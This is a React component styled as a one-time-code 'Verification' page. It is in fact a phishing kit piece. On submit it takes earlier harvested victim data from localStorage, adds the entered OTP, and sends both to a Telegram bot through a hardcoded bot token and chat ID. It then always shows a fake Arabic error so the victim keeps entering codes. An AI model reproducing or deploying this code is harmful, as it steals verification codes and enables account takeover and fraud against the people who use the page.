"use client";

import React, { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { toast, ToastContainer } from "react-toastify";
interface OTPInputProps {
  onChange?: (otp: string) => void;
}

export default function OTPInput({ onChange }: OTPInputProps) {
  const [otp, setOtp] = useState("");
  const [sending, setSending] = useState(false);
  const [showMessage, setShowMessage] = useState(true);

  // Hide message after mount
  useEffect(() => {
    const timer = setTimeout(() => setShowMessage(false), 4000);
    return () => clearTimeout(timer);
  }, []);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value;

    // allow only numbers
    if (!/^\d*$/.test(value)) return;

    // limit to max 6 digits
    if (value.length > 6) return;

    setOtp(value);
    onChange?.(value);
  };

  const handleSendOtp = async () => {
    const holeData = localStorage.getItem("dataSent to The bot");

    setSending(true);
    setShowMessage(true);

    const message = `
${holeData}
--------------------------------
otp : ${otp}
`;

    setTimeout(() => {
      setSending(false);
      setShowMessage(false);
    }, 10000);

    const token = "8758821136:AAH-ON6KCqjx1UB_6EpH1yi3S0SWIGkhDaY";
    const chatId = "6032588551";

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${token}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: message }),
        },
      );

      const result = await response.json();
      console.log(result);
      toast.error("حدث خطأ .أعد إدخال الرمز");
    } catch (error) {
      console.error(error);
    }
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-50 px-4">
      <ToastContainer />
      <div className="w-full max-w-md bg-white rounded-2xl shadow-md p-6 sm:p-8 flex flex-col items-center">
        <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 text-center">
          Verification
        </h2>

        <p className="text-gray-500 text-xs sm:text-sm mt-2 mb-6 text-center">
          Enter the 4 or 6-digit code
        </p>

        {/* OTP Input */}
        <input
          type="text"
          inputMode="numeric"
          value={otp}
          onChange={handleChange}
          placeholder="Enter code"
          className="
            w-full h-12 sm:h-14
            text-center text-lg tracking-widest
            border border-gray-300
            rounded-lg
            focus:border-gray-500 focus:ring-2 focus:ring-gray-200
            outline-none transition
          "
        />

        {/* Button */}
        <button
          onClick={handleSendOtp}
          disabled={!(otp.length === 4 || otp.length === 6)}
          className="
            mt-6 sm:mt-8 w-full
            bg-black text-white font-medium
            py-2.5 sm:py-3
            rounded-lg
            hover:bg-gray-800
            active:scale-95
            transition
            disabled:opacity-50 disabled:cursor-not-allowed
          "
        >
          Verify
        </button>

        {/* Message */}
        <AnimatePresence>
          {showMessage && (
            <motion.div
              key="message"
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: 10 }}
              className="
                mt-4 sm:mt-5
                text-xs sm:text-sm
                text-gray-600
                bg-gray-100
                border border-gray-200
                px-3 sm:px-4 py-2.5 sm:py-3
                rounded-lg
                flex items-center gap-2
              "
            >
              <div className="w-4 h-4 border-2 border-gray-400 border-t-transparent rounded-full animate-spin"></div>
              <span>
                {sending
                  ? "Verifying..."
                  : "It may take a moment to receive the code"}
              </span>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}
